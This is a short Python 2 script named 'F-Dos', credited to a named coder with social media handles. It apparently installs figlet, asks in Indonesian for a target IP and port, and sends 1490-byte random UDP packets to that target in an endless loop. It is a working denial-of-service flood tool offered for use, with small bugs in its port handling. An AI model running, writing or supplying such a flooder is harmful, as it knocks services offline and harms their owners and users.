import os
import sys
import time
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
day = now.day
minute = now.minute
month = now.month
year = now.year

os.system("apt-get install figlet -y ")

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("figlet F-Dos")

print "[==============================]"
print "Coder : Fajar Firdaus "
print "Fb : Fajar Firdaus / Ace.of.spades.729"
print "IG : fajar_firdaus_7"
print "YT : iTech7732"
print "[==============================]"

ip = raw_input("Masukan ip : ")
port = input("Masukan port : ")

sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 0
    print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
if port == 65534:
   port = 0
